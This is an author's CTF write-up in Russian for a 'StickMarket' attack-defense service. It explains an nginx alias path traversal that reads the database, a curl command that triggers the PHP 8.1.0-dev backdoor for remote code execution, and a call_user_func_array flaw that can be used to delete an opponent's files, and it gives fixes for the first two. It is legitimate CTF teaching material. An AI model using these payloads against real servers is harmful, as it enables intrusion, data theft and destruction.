# Авторский writeup на сервис StickMarket

## Описание

Сервис StickMarket представлял собой подобие онлайн-площадки для продажи "палок истины".
Пользователь мог загрузить свою палку, купить чужую (при этом после покупки рендерилась информация "скрытая внутри" самой палки). Так же можно было получить приветсвенный бонус в 100 единиц.

Для загрузки новой палки на маркет необходимо было создать zip архив, содержащий в себе не более двух файлов:
- обязательный файл stick.yml с полями:
    `nameOfStick` -> название палки (по умолчанию `Typical stick`)
    `price` -> цена палки (по умолчанию 1000)
    `description` -> описание (по умолчанию 'Best. Of. The. Best. Stick. Of. Truth.')
    `author` -> автор (по умолчанию `Kartman`)
    `phraseOfTruth` -> собственно фраза, ради получения которой "покупалась палка" (по умолчанию `Truth is lie.`). Тут как раз хранились флаги 
    `image` -> имя jpg картинки товара (по умолчанию `null`. В случае отсутствия данного параметра картинка подгружалась из папки `static/stick.jpg`)

- необязательный файл вида *.jpg (проверялось только расширение через pathinfo)

В случае ошибки валидации полей yaml/присутствия больше двух файлов - сервис сообщал о ошибке.
Чекер проверял корректность сервиса через добавление новой палки на маркет.

## Уязвимости

### nginx alias path traversal

Если обратить внимание на конфиг nginx - видно что для нескольких папок были созданы alias'ы:

```
    location /images {
      alias /var/www/html/stick-market/images/;
    }

    location /static {
      alias /var/www/html/stick-market/static/;
    }
```

В данном случае ошибка заключалась в неправильном указании имени папки (без `/` в конце), что позволяло выполнить загрузку произвольных файлов из системы, например самым интересным файлом являлась БД:

`http://localhost/images../code/market.db`

#### Фикс 

Закрыть уязвимость можно было просто добавив `/` в конце имени папки:

```
    location /images/ {
      alias /var/www/html/stick-market/images/;
    }

    location /static/ {
      alias /var/www/html/stick-market/static/;
    }
```

### php8.1.0-dev backdoor 

Бекдор добавленный в php версии 8.1.0-dev и позволяющий выполнить произвольный код в системе - то есть получить прямую RCE в контейнер.

Пример вызова:
`curl -H "User-Agentt: zerodiumsystem('id');" 'http://localhost:443'`

#### Фикс 

Достаточно было перевести обработку данной папки (`/var/www/html/hello-world`) за nginx (т.к. он использует рhp-fpm).

### Вызов функции UpdateBonus через call_user_func_array

Данная уязвимость не полностью отработала на игре из-за криво пересобранного сервиса.

В файле func.php присутствовал следующий вызов:

```
if (isset($_GET['check']) && is_callable($_GET['check'])) {
    $params = $_GET;
    unset($params['check']);
    call_user_func_array($_GET['check'], $params);
}
```

А так же была интересная функция, позволяющая обнулить информацию о получении бонуса в БД:

```
function UpdateBonus($username) {
    try {
        $db = ConnectDatabase();
        $stmt = $db->prepare("UPDATE users SET bonus=0 WHERE username=:username");
        $stmt->bindValue(':username', $username);
        $stmt->execute();
        return true; 
    } catch (Exception) {
        return false;
    } 
}
```

Что позволяло нам сделать следующий вызов:

```
http://localhost/func.php?check=UpdateBonus&param=user
```

Но так как при финальной пересборке образа мной была допущена ошибка - при sql запросе вместо `:username` биндился `:uuid`, что не позволяло напрямую использовать данный вызов. Но была еще одна интересная фукнция, позволяющая закарраптить сервис противника:

```
function deleteDirectory($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (is_dir($dir . '/' . $object)) {
                    deleteDirectory($dir . '/' . $object);
                } else {
                    unlink($dir . '/' . $object);
                }
            }
        }
        rmdir($dir);
    }
}
```